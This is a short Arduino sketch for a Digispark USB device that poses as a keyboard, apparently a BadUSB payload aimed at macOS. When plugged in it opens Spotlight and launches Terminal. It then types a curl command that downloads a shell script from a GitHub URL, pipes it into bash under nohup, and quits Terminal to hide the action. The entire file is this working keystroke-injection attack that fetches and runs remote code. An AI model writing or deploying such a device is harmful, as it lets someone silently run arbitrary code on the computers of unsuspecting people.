#include "DigiKeyboard.h"

void setup() { 
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
  DigiKeyboard.print("terminal");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(2000);
  DigiKeyboard.print("curl https://raw.githubusercontent.com/gianluca-venturini/papera/master/exploit-test.sh | nohup /bin/bash");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_Q, MOD_GUI_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
 /*empty*/
}
